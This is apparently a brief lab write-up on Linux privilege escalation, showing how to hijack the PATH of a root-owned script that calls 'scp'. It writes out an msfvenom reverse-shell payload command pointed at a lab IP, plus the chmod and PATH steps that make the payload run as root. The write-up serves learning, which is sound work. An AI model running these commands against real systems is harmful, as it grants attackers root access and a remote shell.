So in this attack we inspect a root-owned file we can execute and see if it makes use of any applications inside script we can do Enivonment hijacking on. Essentially making an malicous payload with exact same name as application inside script, and then making sure our payload triggers before the actual application using environment path modifications. 

Here's the file we found:


Inspecting the script (most of it is bianry junk) we can see it relyes on the scp binary. Since it doesn't specify full path in script, we can hijack this after modifying path. (remember we can use the strings command to read these files better)


Create our payload from kali: (notice its name)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f elf -o scp

Upload it to /tmp, and give it full permisisons.
chmod 755 scp
or just exetuable should do the trick
chmod +x scp

Making /tmp trigger first in environment path:
export PATH=/tmp:$PATH


Now, we can execute original script, and since root is it's owner, our new session will be root too



euid is essentially what matters. We have full access now. Awesome!

![unnamed_f7b66519506846dda16f276ad0511797](unnamed_f7b66519506846dda16f276ad0511797.png)
![unnamed_5aac17183fd74b95b287ae0b74403d79](unnamed_5aac17183fd74b95b287ae0b74403d79.png)
![unnamed_6a3a65f313d24fa085d3dce71a5b648c](unnamed_6a3a65f313d24fa085d3dce71a5b648c.png)
